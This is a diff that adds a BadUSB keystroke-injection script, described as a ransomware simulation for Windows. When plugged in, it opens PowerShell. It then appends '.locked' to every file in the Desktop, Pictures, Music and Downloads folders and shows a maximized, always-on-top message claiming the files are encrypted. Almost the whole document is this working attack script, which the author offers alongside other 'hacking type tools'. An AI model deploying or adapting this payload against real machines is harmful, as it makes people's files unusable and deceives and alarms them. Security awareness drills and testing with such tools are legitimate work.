@@ -1,0 +1,91 @@
+REM %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%                      This script was created by github.com/MarkCyber                               %%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%    This script simulates a ransomware attack by changing file extensions and displays a message    %%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%       Renaming file extensions renders each file unusable until the proper extension is added      %%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%        Run (1.1)RansomwareSimulationCleanup to revert the changes and renaming of extensions       %%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+REM %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+DELAY 1000
+GUI r
+DELAY 1000
+REM opens powershell (this is for windows machines)
+STRING powershell
+ENTER
+DELAY 3000
+REM Define the locations using correct SpecialFolder enumerations
+STRING $folders = @(
+DELAY 500
+ENTER
+DELAY 500
+STRING [System.Environment+SpecialFolder]::Desktop,
+DELAY 500
+ENTER
+DELAY 500
+STRING [System.Environment+SpecialFolder]::MyPictures,
+DELAY 500
+ENTER
+DELAY 500
+STRING [System.Environment+SpecialFolder]::MyMusic,
+DELAY 500
+ENTER
+DELAY 500
+STRING [System.Environment+SpecialFolder]::Downloads
+DELAY 500
+ENTER
+DELAY 500
+STRING )
+DELAY 500
+ENTER
+DELAY 500
+REM Iterate over each location
+STRING foreach ($folder in $folders) {
+DELAY 500
+ENTER
+DELAY 500
+STRING $path = [Environment]::GetFolderPath($folder)
+DELAY 500
+ENTER
+DELAY 500
+REM Get all files in the path and rename them
+STRING Get-ChildItem -Path $path -File | ForEach-Object { Rename-Item -Path $_.FullName -NewName ($_.Name + '.locked') }
+DELAY 500
+ENTER
+DELAY 500
+STRING }
+DELAY 500
+ENTER
+DELAY 2000
+REM Display ransomware message
+STRING Add-Type -AssemblyName PresentationFramework
+DELAY 500
+ENTER
+DELAY 500
+STRING $Window = New-Object System.Windows.Window
+DELAY 500
+ENTER
+DELAY 500
+STRING $Window.WindowStartupLocation = 'CenterScreen'
+DELAY 500
+ENTER
+DELAY 500
+STRING $Window.WindowState = 'Maximized'
+DELAY 500
+ENTER
+DELAY 500
+STRING $Window.Topmost = $true
+DELAY 500
+ENTER
+DELAY 500
+STRING $Window.Content = 'Your files have been encrypted. This is a simulation. Please contact your IT support team.'
+DELAY 500
+ENTER
+DELAY 500
+STRING $Window.ShowDialog()
+DELAY 500
+ENTER
+DELAY 2000
+STRING exit
+DELAY 500
+ENTER
+REM check out my github at github.com/markcyber for more badusb & hacking type tools
